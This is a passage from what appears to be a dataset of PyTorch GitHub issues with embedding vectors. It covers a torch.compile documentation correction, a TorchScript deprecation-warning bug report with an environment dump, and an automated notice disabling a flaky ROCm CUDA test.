 -2.44829040e-02  5.03543019e-01  4.19269383e-01  1.52302057e-01
  1.60461850e-02  2.53644884e-01  1.29526407e-01  1.44859433e-01
 -1.49792016e-01 -2.70988405e-01 -1.67920068e-02 -2.35587001e-01
 -8.95804465e-02  1.19639575e-01  2.76220273e-02 -2.22529486e-01
  1.83627382e-01 -2.40532458e-02  3.81926186e-02 -5.29993651e-03
  1.90539077e-01  1.01850636e-01 -4.96027619e-03 -1.35006934e-01
  9.88443941e-03  4.57998216e-02 -2.20054165e-01 -7.44907558e-03
 -3.09723258e-01 -2.92199124e-02 -9.73640978e-02 -1.03286847e-01
  6.88170865e-02 -1.36412591e-01 -2.28496432e-01  1.68392792e-01
  2.18443617e-01  1.07941963e-02  3.00868392e-01  1.59464162e-02
 -8.53011832e-02 -1.89276740e-01 -1.04374267e-01 -2.25978240e-01
  1.58816993e-01 -2.66317308e-01 -4.99946743e-01 -3.43903229e-02
  2.91324537e-02  3.52592543e-02 -9.11444426e-02 -9.02106464e-02
  1.97801396e-01 -1.71331733e-01  1.84148923e-03  1.64956674e-01
 -1.97275490e-01  7.78031349e-02 -1.50640473e-01  1.14299104e-01
 -2.21434027e-01 -1.22037187e-01  2.04710271e-02 -1.62002787e-01
  1.36362702e-01 -1.40807956e-01 -1.73332900e-01 -2.02067494e-01
  4.07156423e-02  2.76273042e-01 -1.12270623e-01  8.49004388e-02
  4.54896182e-01 -5.67121105e-03  3.34427476e-01  1.72284748e-02
 -1.84080638e-02 -1.31779045e-01 -1.01181358e-01 -4.82387654e-03
  1.66488871e-01  6.57340288e-02 -1.05704866e-01  6.01552129e-01
  3.31533641e-01 -1.27262667e-01 -4.44434136e-01  2.73163050e-01
 -6.80256486e-02  3.91801931e-02  9.15276483e-02 -1.96586430e-01
  4.06298459e-01  1.85923893e-02  8.39211196e-02  2.43085861e-01
  4.78434950e-01 -2.60669351e-01  1.84829347e-02  1.36858933e-02
  1.38583094e-01  1.56645834e-01  1.20126382e-02  1.34683609e-01
  1.73448086e-01 -1.34174451e-01  1.98445082e-01 -1.11807473e-02
 -2.22166091e-01  3.04422885e-01 -1.93084180e-02  1.22382760e-01
  7.50457942e-02  1.64936110e-01 -2.31694892e-01 -1.34490564e-01
 -3.45413983e-02 -1.84767932e-01  1.33792952e-01  2.16691718e-01
 -1.11912593e-01  2.94892546e-02  2.74346054e-01 -5.09957522e-02
 -2.83933759e-01  5.23314402e-02 -4.51084450e-02  5.19566759e-02
  1.54238403e-01 -2.83058584e-01  5.10575294e-01  1.40718937e-01
 -1.89017549e-01  3.46595883e-01 -2.84052014e-01  4.00571749e-02
 -2.92022943e-01  4.87988085e-01  3.46153975e-01 -2.26568416e-01
 -2.11313888e-02  1.63926169e-01 -2.57833779e-01  9.99674052e-02
  2.27720842e-01  3.76010478e-01 -2.11021900e-01 -1.69979364e-01
 -2.03453496e-01 -2.48015746e-01  4.74642292e-02 -8.96272361e-02
  3.85975763e-02  2.07901224e-01  3.03667665e-01  1.08822577e-01
 -7.17397854e-02 -2.08318941e-02 -2.42114477e-02 -3.53076875e-01
  1.14260107e-01  1.92026556e-01  3.35495323e-01 -2.78969765e-01
 -3.05743814e-01  2.01925948e-01  4.75818276e-01  6.31811976e-01
 -1.51007757e-01  4.06067781e-02 -8.85442868e-02 -6.66028485e-02
 -2.22436666e-01 -6.83406591e-02 -3.18465412e-01  3.01905006e-01
 -2.87403166e-01 -3.09778631e-01  3.05876166e-01  3.28242123e-01
 -4.71352339e-01  2.38914520e-01 -1.69734031e-01 -1.25362873e-01
  9.41285491e-02 -1.49257239e-02 -6.45317286e-02 -6.50555044e-02
 -3.09842378e-02  2.68190056e-01 -2.95470297e-01 -6.40215427e-02
 -2.31509954e-01  2.62674749e-01  1.93407714e-01  1.59189701e-01
 -8.49472433e-02 -7.30692968e-02  2.36744821e-01 -7.15166777e-02
 -2.62171596e-01  1.79764964e-02 -1.60915658e-01 -7.40495324e-02]"
Documentation Clarification on torch.compile Example module: docs triaged,"### ðŸ“š The doc issue

I came across an example in the [torch.compiler documentation](https://pytorch.org/docs/main/torch.compiler_get_started.html)

```py
import torch
def fn(x, y):
    a = torch.cos(x).cuda()
    b = torch.sin(y).cuda()
    return a + b
new_fn = torch.compile(fn, backend=""inductor"")
input_tensor = torch.randn(10000).to(device=""cuda:0"")
a = new_fn(input_tensor, input_tensor)
```

The documentation mentions that *we can turn 2 reads and 2 writes into 1 read and 1 write*. However, given there are three distinct operations, I'm inclined to think there should be 4 reads (x, y, a, b) and 3 writes (a, b, a+b). Can you confirm this?

Additionally, there's a note which says:

*To run this script, you need to have at least one GPU on your machine. If you do not have a GPU, you can remove the cuda() code in the snippet below and it will run on CPU.*

However, the crucial step to ensure GPU usage is the `.to(device=""cuda:0"")`. Merely removing .cuda() won't make the tensor reside on the CPU. 

### Suggest a potential alternative/fix

Hence, I'd suggest updating the note to:

```note
To run this script, you need to have at least one GPU on your machine. If you do not have a GPU, you can remove the `.to(device=""cuda:0"")` code in the snippet below and it will run on CPU.
```

Lastly, since .cuda() in the fn function seems redundant if we're already specifying the device using .to(device=""cuda:0""), consider updating the function as:

```py
import torch
def fn(x, y):
    a = torch.cos(x)
    b = torch.sin(y)
    return a + b
```

Thank you for considering these suggestions. Looking forward to your feedback!

cc @svekars @carljparker",False,"[-0.5839673   0.1328379  -0.34794992  0.42085832  0.10717372 -0.11494249
 -0.23256907  0.30925894 -0.36418676  0.05997596 -0.18024534  0.0032582
 -0.3472076   0.11350682 -0.16450456 -0.02527381 -0.2181522  -0.40649372
 -0.16523463 -0.26937872  0.37800378  0.13563086 -0.14723611 -0.14710623
  0.04524024  0.20668274 -0.4836563  -0.14061841  0.33196884 -0.04450896
 -0.05924284 -0.26833078 -0.526517    0.16152525  0.19234698  0.07863194
 -0.00814221  0.09288648 -0.14090054 -0.13560782  0.11969659  0.06462087
 -0.28413773  0.12896994  0.09469898 -0.05876915 -0.02722874  0.13252068
 -0.26220667 -0.15747972 -0.13891977 -0.03701376 -0.09200336  0.04865692
  0.32780623 -0.3404169   0.01545148  0.1179287   0.29059613 -0.51503193
  0.14040893 -0.02761829 -0.03567134 -0.02584432  0.0776863  -0.1438862
 -0.2488859   0.3603365   0.44087586 -0.09607561 -0.165283    0.07732031
  0.13882658 -0.04885942 -0.16626051 -0.08186179 -0.54006463  0.13582328
 -0.38481236 -0.1983169   0.18425998  0.07839221  0.00094946  0.15530658
  0.08474508  0.21204576  0.26922053 -0.08837858  0.45166773  0.2095516
  0.03462985  0.03228151  0.15036204  0.41823798 -0.18929741  0.09387111
  0.14505482 -0.06756322  0.12032025 -0.25138065 -0.22052413 -0.68354225
 -0.10218608  0.29952484  0.31398705 -0.28520048  0.11120196  0.5749534
  0.18139873 -0.40457717  0.33644116  0.10032356 -0.27697158 -0.28242153
 -0.03228044 -0.19155389 -0.43359715 -0.25596493 -0.16052485  0.2106322
  0.37566704  0.5875752   0.07831758  0.1691181   0.46565935 -0.03118743
  0.09162848  0.03109307 -0.10551249  0.07482623 -0.00133834  0.13135125
  0.31091028  0.05679356  0.535005    0.3247948  -0.35080957  0.01140822
  0.19677067  0.08745369 -0.1744383  -0.00675475 -0.07930896 -0.40863127
  0.20289049 -0.04498336 -0.37309304 -0.06252702  0.22220734  0.14758167
  0.173357   -0.14859341 -0.57384837  0.38843054 -0.07245113 -0.03690402
  0.226515   -0.0009644   0.29443496 -0.35754555  0.21645023  0.21031308
  0.10066783  0.1346943   0.27206796 -0.07934073 -0.1590712  -0.1200116
 -0.47836712  0.00928583  0.12197952 -0.17827258 -0.08773234  0.01264512
  0.02212849 -0.01690035 -0.17419691 -0.2687141  -0.17715491  0.6691077
  0.53354883  0.5690414   0.24518502  0.148098   -0.07685815  0.2311638
  0.29260638 -0.13226813 -0.06694464  0.00832932 -0.34224766 -0.20086753
  0.03662804 -0.2770909  -0.02948836  0.34708178  0.02894826  0.00184627
 -0.25102377 -0.09343834 -0.27957016  0.0213128   0.06332609 -0.05133033
  0.06473849  0.08386086 -0.51983225 -0.4110946  -0.44749475  0.02720126
 -0.37066752 -0.10038166 -0.14992967 -0.1287018   0.12610817  0.3158391
 -0.09088403 -0.12482874 -0.03289619  0.14145185  0.5759628  -0.17744932
  0.1047186  -0.21283293  0.34968835  0.19280683 -0.20024109  0.01054302
  0.06022743 -0.00224012 -0.11735746 -0.49109697  0.27849016  0.13315925
  0.020188    0.51555526 -0.11092515 -0.0533691  -0.18182005  0.12494444
 -0.11271097  0.00248193  0.24123776 -0.08722495 -0.18520042 -0.05840595
 -0.4131734  -0.17207369 -0.19473806  0.01048391  0.08181038 -0.08174823
 -0.27257848  0.02139232  0.2743267   0.07329999 -0.02250279 -0.12283587
 -0.1989915  -0.01780646 -0.1014147   0.11194734  0.04038538  0.0811884
  0.42167374 -0.07952231 -0.07833708  0.13677128 -0.4931432   0.01427875
 -0.05011924 -0.31749418  0.42294943  0.13741362  0.21450007 -0.2911291
  0.22526014 -0.336684   -0.02039211 -0.4295931   0.322231    0.12093467
 -0.2664924   0.32514518  0.47551137 -0.12541711 -0.03033894  0.05446003
 -0.13431692 -0.2854727  -0.29929274 -0.02812918  0.4971151  -0.21922399
 -0.06597301  0.2044664   0.07295866 -0.14327672  0.1409738   0.18867789
 -0.23622575  0.0866029   0.13461618 -0.09411465 -0.18803084 -0.08138935
  0.20708208  0.06206001  0.5297425  -0.3800789   0.34851563  0.0302591
 -0.23919888  0.3936866   0.04045669  0.176577    0.01358141  0.2754451
  0.09859626  0.10587127 -0.17454217 -0.20176655 -0.2846072   0.06646453
 -0.07211111  0.05404847 -0.12592617  0.360446   -0.34686464 -0.03583551
  0.03024054 -0.00907929  0.3708611   0.04308114 -0.17860506 -0.06097846
 -0.00912643  0.16723296  0.05325439 -0.27769417 -0.28527713 -0.06204632
 -0.01160621 -0.01149152 -0.26010656 -0.2204378   0.24003688  0.21399169
 -0.06761032 -0.06039538  0.13989396  0.13998379 -0.03428164  0.4475357
  0.23518607  0.47481012 -0.06371258  0.26095003  0.02348676  0.21197475
 -0.02933548  0.15054977 -0.22951134 -0.15746976 -0.16904667  0.07733044
 -0.23595385  0.14912003  0.00212907  0.1642645  -0.22158837  0.0220897
 -0.06057326  0.2860265   0.55971706 -0.21669126 -0.04297086 -0.18971813
  0.2249875  -0.19237554  0.06875918  0.13162178  0.34807658 -0.10153678]"
torchscript throws warnings on everything oncall: jit,"```py
import torch

scripted = torch.jit.script(torch.nn.Conv2d(3, 3, 3))
img = torch.rand(1, 3, 20, 20)

import warnings
warnings.simplefilter('module')

scripted(img)
```

```
/home/nicolashug/.miniconda3/envs/pt/lib/python3.9/site-packages/torch/nn/modules/module.py:1528: UserWarning: torch::jit::fuser::cuda::isEnabled() is deprecated (Triggered internally at /opt/conda/conda-bld/pytorch_1696837183797/work/torch/csrc/jit/codegen/cuda/interface.cpp:54.)
  return forward_call(*args, **kwargs)
```

This seems to be caused by https://github.com/pytorch/pytorch/pull/110318 and resuts in the torchvision test suite to fail https://github.com/pytorch/vision/issues/8030

@jjsjann123 @davidberard98



---------


```
Collecting environment information...
PyTorch version: 2.2.0.dev20231009
Is debug build: False
CUDA used to build PyTorch: None
ROCM used to build PyTorch: N/A

OS: Fedora release 36 (Thirty Six) (x86_64)
GCC version: (GCC) 12.2.1 20221121 (Red Hat 12.2.1-4)
Clang version: 14.0.5 (Fedora 14.0.5-2.fc36)
CMake version: version 3.23.1
Libc version: glibc-2.35

Python version: 3.9.12 | packaged by conda-forge | (main, Mar 24 2022, 23:25:59)  [GCC 10.3.0] (64-bit runtime)
Python platform: Linux-6.2.15-100.fc36.x86_64-x86_64-with-glibc2.35
Is CUDA available: False
CUDA runtime version: No CUDA
CUDA_MODULE_LOADING set to: N/A
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA
HIP runtime version: N/A
MIOpen runtime version: N/A
Is XNNPACK available: True

CPU:
Architecture:                    x86_64
CPU op-mode(s):                  32-bit, 64-bit
Address sizes:                   39 bits physical, 48 bits virtual
Byte Order:                      Little Endian
CPU(s):                          8
On-line CPU(s) list:             0-7
Vendor ID:                       GenuineIntel
Model name:                      11th Gen Intel(R) Core(TM) i5-1145G7 @ 2.60GHz
CPU family:                      6
Model:                           140
Thread(s) per core:              2
Core(s) per socket:              4
Socket(s):                       1
Stepping:                        1
CPU(s) scaling MHz:              91%
CPU max MHz:                     4400.0000
CPU min MHz:                     400.0000
BogoMIPS:                        5222.40
Flags:                           fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx pdpe1gb rdtscp lm constant_tsc art arch_perfmon pebs bts rep_good nopl xtopology nonstop_tsc cpuid aperfmperf tsc_known_freq pni pclmulqdq dtes64 monitor ds_cpl vmx smx est tm2 ssse3 sdbg fma cx16 xtpr pdcm pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand lahf_lm abm 3dnowprefetch cpuid_fault epb cat_l2 invpcid_single cdp_l2 ssbd ibrs ibpb stibp ibrs_enhanced tpr_shadow vnmi flexpriority ept vpid ept_ad fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid rdt_a avx512f avx512dq rdseed adx smap avx512ifma clflushopt clwb intel_pt avx512cd sha_ni avx512bw avx512vl xsaveopt xsavec xgetbv1 xsaves split_lock_detect dtherm ida arat pln pts hwp hwp_notify hwp_act_window hwp_epp hwp_pkg_req avx512vbmi umip pku ospke avx512_vbmi2 gfni vaes vpclmulqdq avx512_vnni avx512_bitalg tme avx512_vpopcntdq rdpid movdiri movdir64b fsrm avx512_vp2intersect md_clear ibt flush_l1d arch_capabilities
Virtualization:                  VT-x
L1d cache:                       192 KiB (4 instances)
L1i cache:                       128 KiB (4 instances)
L2 cache:                        5 MiB (4 instances)
L3 cache:                        8 MiB (1 instance)
NUMA node(s):                    1
NUMA node0 CPU(s):               0-7
Vulnerability Itlb multihit:     Not affected
Vulnerability L1tf:              Not affected
Vulnerability Mds:               Not affected
Vulnerability Meltdown:          Not affected
Vulnerability Mmio stale data:   Not affected
Vulnerability Retbleed:          Not affected
Vulnerability Spec store bypass: Mitigation; Speculative Store Bypass disabled via prctl
Vulnerability Spectre v1:        Mitigation; usercopy/swapgs barriers and __user pointer sanitization
Vulnerability Spectre v2:        Mitigation; Enhanced IBRS, IBPB conditional, RSB filling, PBRSB-eIBRS SW sequence
Vulnerability Srbds:             Not affected
Vulnerability Tsx async abort:   Not affected

Versions of relevant libraries:
[pip3] flake8==6.0.0
[pip3] mypy==0.991
[pip3] mypy-extensions==0.4.3
[pip3] numpy==1.24.2
[pip3] onnx==1.13.1
[pip3] onnxruntime==1.14.1
[pip3] pytorch-sphinx-theme==0.0.24
[pip3] torch==2.2.0.dev20231009
[pip3] torchrl==0.1.1+3f4e9aa
[pip3] torchvision==0.17.0a0+1101c3d
[conda] blas                      1.0                         mkl  
[conda] cpuonly                   2.0                           0    pytorch-nightly
[conda] mkl                       2021.4.0           h06a4308_640  
[conda] mkl-service               2.4.0            py39h7f8727e_0  
[conda] mkl_fft                   1.3.1            py39hd3c417c_0  
[conda] mkl_random                1.2.2            py39h51133e4_0  
[conda] numpy                     1.24.2                   pypi_0    pypi
[conda] pytorch                   2.2.0.dev20231009     py3.9_cpu_0    pytorch-nightly
[conda] pytorch-mutex             1.0                         cpu    pytorch-nightly
[conda] pytorch-sphinx-theme      0.0.24                    dev_0    <develop>
[conda] torchfix                  0.0.1                    pypi_0    pypi
[conda] torchrl                   0.1.1+3f4e9aa             dev_0    <develop>
[conda] torchvision               0.14.0a0+fc18542          pypi_0    pypi

```

cc @EikanWang @jgong5 @wenzhe-nrv @sanchitintel",False,"[-5.73972940e-01 -1.87020466e-01 -1.76336318e-01  1.48562983e-01
  2.20187575e-01 -3.36288214e-01  6.68562353e-02  1.83443964e-01
 -3.55437100e-01 -1.66658908e-01 -3.57243836e-01 -3.75558957e-02
 -1.87975913e-01  2.16168165e-01  1.43641546e-01  1.15262628e-01
 -1.83911890e-01 -4.26945031e-01 -7.56229907e-02 -2.35667497e-01
  3.26760650e-01  3.94543186e-02 -4.61990312e-02  1.01209441e-02
 -1.78361461e-01  1.85012549e-01 -1.86259508e-01 -2.61725634e-02
  2.50234008e-01  1.40345335e-01  9.21489745e-02 -3.43975574e-02
 -6.27561152e-01 -9.49763972e-03  2.56076813e-01  1.82626799e-01
 -4.07571793e-02 -4.36664149e-02 -1.67208225e-01 -3.65270019e-01
  2.96672046e-01  1.66604400e-01  3.86004187e-02 -3.16429548e-02
  1.36601463e-01 -1.10182827e-02 -8.93082619e-02  1.25316322e-01
 -2.22785532e-01 -1.45886451e-01 -7.99117908e-02  1.50684804e-01
 -6.35749996e-02 -5.83738014e-02  2.99311846e-01 -4.61270094e-01
 -1.65675402e-01 -1.62275340e-02  2.60468185e-01 -2.45944515e-01
 -1.82910174e-01  1.20963946e-01 -2.13618577e-03  1.96993947e-02
  5.28174378e-02  8.12388361e-02 -6.16789833e-02  2.37147808e-01
  3.26911986e-01 -2.56782677e-02  9.02848244e-02 -1.06760442e-01
  1.81760505e-01 -3.62866223e-02  7.00725615e-02 -9.35134590e-02
 -2.90439308e-01  7.81788677e-02 -1.24666333e-01 -2.89643198e-01
  4.36546430e-02 -1.50987953e-01  3.45202237e-01 -7.05543011e-02
  1.50878668e-01  1.94028169e-01  2.29390532e-01 -5.26546314e-03
  5.52421987e-01  3.03455174e-01 -8.43322426e-02 -1.44607618e-01
  3.27418268e-01  4.60697919e-01 -2.10578501e-01  7.34810755e-02
  3.44991058e-01 -2.60828733e-01 -3.70461702e-01 -1.63919240e-01
 -9.03180316e-02 -8.30529332e-01 -2.12425068e-01  3.73023629e-01
  2.82478869e-01 -8.67161900e-02  3.27570200e-01  2.73843020e-01
  1.10584423e-01 -2.48728961e-01  1.07711241e-01  7.40045533e-02
 -5.37509695e-02 -3.41196239e-01 -6.48625419e-02 -5.52917123e-02
 -2.04925418e-01 -1.25461936e-01 -6.05904721e-02  4.98280644e-01
 -1.05220135e-02  3.64760637e-01  1.45820633e-01  1.54375240e-01
  3.76117826e-01  1.19433060e-01  4.90735546e-02 -1.20189302e-02
  1.64317489e-02  1.95493460e-01 -2.21248701e-01  1.53499797e-01
 -1.82673410e-02  4.77870516e-02  4.76562977e-01  6.29369095e-02
 -3.61737639e-01  7.19821304e-02  3.66043486e-02 -2.66417086e-01
 -8.23792517e-02  2.27155775e-01 -1.10813662e-01 -2.01863676e-01
  2.04418406e-01 -3.93802017e-01  5.36714643e-02  2.62976319e-01
 -6.18628897e-02 -2.20791668e-01  1.08747464e-02  1.87577292e-01
 -5.59940994e-01  6.29178464e-01 -1.16040170e-01  2.20588088e-01
  2.53122449e-01  5.99070489e-02  3.09292972e-01 -1.97099328e-01
  3.80861104e-01  2.59604603e-01  3.06828290e-01  1.02908462e-02
  2.04524428e-01 -1.47202522e-01 -3.69929910e-01 -4.41194624e-02
 -6.32407308e-01 -5.13172857e-02 -2.88679004e-01 -1.35429054e-01
 -2.44146615e-01 -7.76622072e-02  2.32117288e-02 -1.28215224e-01
 -9.93655100e-02 -2.51608253e-01 -2.86568522e-01  3.96186888e-01
  3.96623969e-01  3.51901948e-01  2.28167400e-01  4.15759385e-02
 -1.92164838e-01  1.82814538e-01  3.89755398e-01 -2.15326697e-01
 -8.68763123e-03 -1.41835213e-01 -4.03918535e-01 -2.34793752e-01
  2.29280025e-01 -1.82438090e-01 -2.17505675e-02  4.18696344e-01
 -1.68761820e-01 -3.01380664e-01 -1.93883240e-01 -7.73790181e-02
  1.43824488e-01  3.37667704e-01  3.55868414e-03 -8.50420520e-02
  2.14574169e-02  2.27999300e-01 -3.10323238e-01 -4.11145926e-01
 -1.81095928e-01 -4.77182567e-02 -1.09910026e-01  3.50069776e-02
  4.14677411e-02 -1.23494431e-01  6.00311682e-02  2.24748611e-01
 -5.09310812e-02  5.16086221e-02  3.53595972e-01 -5.95250949e-02
  3.52939397e-01 -1.52593330e-01 -1.37076795e-01 -9.91393030e-02
  1.20246850e-01  4.13339883e-01 -3.06320012e-01  1.13238141e-01
 -1.61874354e-01 -1.77983604e-02 -2.44950540e-02 -2.01643199e-01
  6.80463552e-01 -1.21130496e-01 -5.26483320e-02  4.05114174e-01
 -7.52539933e-02 -1.04665339e-01 -2.36256644e-01  2.61671692e-01
 -1.80794150e-01  1.36884898e-01  2.85111606e-01 -1.82072684e-01
 -5.73690832e-02 -1.35868579e-01 -4.46305633e-01 -2.27553278e-01
 -2.02194333e-01 -2.09689885e-02  1.49162307e-01 -7.92262703e-02
 -4.51589853e-01  1.43535137e-01  3.68890762e-01  5.90404749e-01
 -8.33716094e-02  1.82079338e-02 -1.56655014e-01 -3.15221339e-01
  6.84196204e-02  2.21516013e-01 -5.70699871e-02 -2.11099565e-01
  2.44209900e-01 -2.64597051e-02 -1.81470603e-01  2.09821522e-01
 -1.72800004e-01  7.86310881e-02 -6.88790530e-02 -3.11465442e-01
  4.19603884e-01  2.43636414e-01  1.07799321e-01 -1.97354272e-01
  3.33773971e-01 -2.86898196e-01 -2.93311417e-01 -4.50269461e-01
  2.84863055e-01  1.28345847e-01  1.48406476e-01  3.59520048e-01
  4.53058749e-01 -2.44030774e-01 -3.47830802e-02 -1.54503509e-01
 -9.21202302e-02 -2.75338084e-01 -3.77063483e-01 -1.22241504e-01
  7.61702180e-01 -8.65144283e-02 -3.83175239e-02 -8.85109827e-02
 -5.64897433e-02 -1.58889264e-01 -1.05831556e-01  2.14239359e-02
 -7.66259581e-02  3.13955843e-01  1.44641802e-01  9.85905826e-02
  2.23633975e-01 -2.05785960e-01  1.04386955e-01 -4.28380147e-02
  3.05537850e-01 -3.97833347e-01  2.32769117e-01  7.82510564e-02
 -2.43823737e-01  9.37783271e-02 -1.69649929e-01  4.46722388e-01
  3.51514593e-02  3.10453832e-01  1.83641672e-01  7.43056983e-02
  6.08806834e-02 -2.05318511e-01 -3.85518014e-01 -1.84901208e-01
 -3.47450823e-01  4.22297567e-01 -3.49300444e-01  7.80096874e-02
 -9.38563943e-02 -9.26605016e-02  3.93601209e-01 -9.93581936e-02
  1.48927504e-02 -5.10060862e-02 -1.56040549e-01  3.47756185e-02
 -5.43133691e-02  1.91607744e-01 -2.54918076e-02 -1.16319038e-01
 -9.02222991e-02 -1.37676850e-01  2.99202651e-01 -9.41248052e-03
 -1.07511491e-01 -3.35624278e-01  3.30560893e-01 -4.99368757e-02
 -6.75182566e-02  8.84486288e-02 -2.81098485e-01  5.15381433e-03
 -1.37577087e-01  4.85340118e-01 -8.39201957e-02  5.97424030e-01
 -1.91443220e-01  3.85401547e-02  1.88018709e-01  3.70423764e-01
  3.72239165e-02 -3.02403569e-02 -3.38906378e-01 -4.00204241e-01
  3.73498723e-03  9.11195874e-02 -7.90634900e-02 -3.17376405e-01
  2.84199119e-02  1.72826461e-04 -4.99327295e-02 -4.54139709e-02
 -8.46576393e-02  3.71165335e-01  4.89419222e-01 -2.74047196e-01
  3.75629216e-02 -2.66452543e-02  1.91464335e-01  8.61607864e-03
  4.32403274e-02  2.12881446e-01 -1.09041184e-02 -3.05198371e-01]"
DISABLED test_pinned_memory_with_cudaregister (__main__.TestCuda) module: cuda module: rocm triaged module: flaky-tests skipped,"Platforms: rocm

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/failure/test_pinned_memory_with_cudaregister) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17481200354).

Over the past 72 hours, it has flakily failed in 9 workflow(s).

**Debugging instructions (after clicking on the recent samples link):**
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Grep for `test_pinned_memory_with_cudaregister`


Test file path: `test_cuda.py`

cc @ptrblck @jeffdaily @sunway513 @jithunnair-amd @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False,"[-3.10438126e-03 -1.72370046e-01 -3.76197100e-01 -6.92091137e-03
 -7.22462982e-02 -1.37123451e-01  1.86242208e-01  1.00393549e-01
 -3.56455803e-01 -1.37895823e-01  2.90414006e-01 -4.94171321e-01
  1.53553724e-01  4.47634608e-02 -4.91402239e-01 -2.39362214e-02
 -3.83409411e-02  1.21309012e-01  1.83119908e-01  1.09052569e-01
 -2.37267286e-01 -1.13585358e-02 -4.09883142e-01  1.80451721e-01
 -2.37850338e-01  2.32591420e-01 -3.15820396e-01 -3.15078080e-01
  5.65452874e-03 -6.14394248e-02  1.11493677e-01  1.55034140e-01
 -7.77039602e-02  1.95311934e-01  2.99428135e-01 -1.38799995e-01
 -4.72581685e-01 -1.94860816e-01 -7.96797723e-02 -2.28653729e-01
  1.14958361e-02 -8.24649036e-02  1.30162183e-02  2.32197363e-02
 -3.56099941e-02 -2.44661123e-02 -6.65541738e-03  1.60815895e-01
 -1.69737011e-01 -8.37861374e-02  2.42232203e-01  8.65610987e-02
  6.14229552e-02 -4.12465394e-01 -5.26809506e-02  4.39805910e-02
  1.15456879e-01  2.31520727e-01 -2.56717019e-02  4.38869298e-01
  2.81322509e-01  9.00397599e-02 -1.63704947e-01  4.81726304e-02
  4.26731296e-02  3.01966280e-01  1.62262693e-02 -5.75079694e-02
  4.51951087e-01  7.44911879e-02 -5.32975979e-02  6.87866732e-02
 -3.49887729e-01 -5.90234995e-02  1.99787155e-01  3.45573395e-01
  3.58902924e-02 -8.53858441e-02 -5.12500852e-02 -1.40322819e-01
  1.16020069e-03  3.65238219e-01  7.39524662e-02 -2.55677879e-01
  1.63599268e-01 -2.33312041e-01  1.98683947e-01 -6.22144081e-02
 -7.91640393e-03 -2.84377515e-01  2.76443481e-01  3.19829702e-01
  3.44665796e-02  1.91837445e-01 -1.45738602e-01 -1.87697530e-01
 -7.35405907e-02  5.92647865e-03 -5.50757587e-01  3.45132388e-02
  1.31377190e-01  5.03749847e-02 -1.72687262e-01  4.91201758e-01
 -4.61446464e-01 -2.12154970e-01  3.15132737e-01 -1.18593641e-01
 -1.08356029e-01  1.64612785e-01  1.62238196e-01 -4.04700730e-03
  8.49090666e-02  2.28690147e-01  2.05240324e-02  1.18727721e-01
 -2.61940658e-01 -2.75658816e-01 -9.47750434e-02  4.32766438e-01
 -3.31173271e-01 -2.88986355e-01  6.28868192e-02 -7.67481104e-02
  1.87719971e-01 -1.33564487e-01  8.38188455e-03  8.84898454e-02
 -2.37700883e-02 -9.55155790e-02 -3.31898406e-02  3.42091769e-02
  2.01226458e-01 -1.45557031e-01 -1.81848973e-01  2.06537202e-01
 -1.99508250e-01 -7.26133958e-02  2.44826838e-01 -7.06314296e-02
 -2.40900159e-01  3.23248148e-01 -1.27240241e-01 -3.22449170e-02
  2.56476671e-01  6.87665492e-02 -1.65476874e-01  4.56635691e-02
  9.43410024e-02  3.60343218e-01  1.37900844e-01 -1.69601873e-01
 -9.63613540e-02  6.81413889e-01 -8.68838429e-02 -1.61334444e-02
  5.15780687e-01  2.05719993e-01 -1.38423115e-01 -3.52527559e-01
  6.87367395e-02  3.14792812e-01  2.01212037e-02 -4.76202369e-03
  2.89566219e-01 -5.01408651e-02 -2.83421099e-01  7.00335652e-02
  5.84533624e-03  2.84483433e-01  2.06976220e-01  2.14928649e-02
  2.34485731e-01 -1.06517822e-01  1.36471152e-01 -3.25848490e-01
 -5.62184565e-02 -1.45711780e-01  1.00665331e-01  2.16817051e-01
 -2.21627325e-01  1.37841091e-01  2.62806803e-01 -2.17596024e-01
 -2.00349301e-01  2.02972859e-01  5.00529706e-02  6.19096905e-02
 -1.95329078e-04 -1.11841105e-01 -6.50545955e-01 -4.00227532e-02
 -1.82270914e-01 -3.54379155e-02 -1.87521696e-01 -1.11664787e-01
  1.31336957e-01 -2.28198618e-01 -1.25234306e-01 -2.66263224e-02
 -1.51153266e-01  2.04297364e-01 -1.40254140e-01 -1.43950447e-01
 -6.40131012e-02  5.04294001e-02 -2.21573919e-01 -3.53929162e-01
  9.02827084e-02  2.01007754e-01 -1.98182836e-01 -2.02510014e-01
 -2.62745470e-01 -2.21436188e-01  7.13630617e-02  2.46862710e-01
  1.14433303e-01  1.27295218e-02 -2.43910268e-01  2.26723537e-01
  4.32941675e-01 -2.12688789e-01  1.77685440e-01 -2.50297219e-01
 -3.46380845e-02 -2.53991038e-01 -5.62554523e-02  4.36787456e-02
 -4.88958657e-02 -4.29913625e-02 -5.37421256e-02 -7.27847368e-02
 -1.70203805e-01 -1.78268135e-01  6.48390874e-02 -8.38490874e-02
 -1.44735947e-02 -1.79076403e-01  7.07269832e-02  1.73522174e-01
 -4.00975674e-01 -2.88237810e-01 -3.13409805e-01  2.77188923e-02
  3.74860644e-01  4.13816571e-01 -2.81549394e-02  2.33701505e-02
 -3.30854177e-01  1.78160369e-02  7.01620057e-03 -2.63709903e-01
  2.69696951e-01  2.06068560e-01 -1.04102537e-01  2.83703148e-01
 -3.52428481e-02 -2.06832644e-02 -7.33645074e-03 -1.50774077e-01
  2.24109516e-01  4.20435816e-01 -2.98859477e-01  5.08149385e-01
  3.08937222e-01  3.05946708e-01 -3.54002893e-01  5.11762686e-02
 -2.11059272e-01 -3.19827422e-02 -3.22933532e-02 -4.08421427e-01
  3.68587941e-01  6.88450262e-02  1.53581440e-01 -3.21405739e-01
  5.39515376e-01 -1.78139806e-01  1.86396800e-02  5.76282032e-02
  3.11262012e-01 -1.33635029e-01  8.12824294e-02  1.79826438e-01
  2.74359465e-01 -1.40613005e-01 -2.32896641e-01 -3.73631537e-01
 -1.10341787e-01 -1.17017850e-01 -2.18036443e-01  3.85416448e-01
  6.20207638e-02 -4.44358997e-02 -1.84396401e-01  4.82753143e-02
  8.30151141e-02  2.60157049e-01  2.48161748e-01 -6.03134334e-02
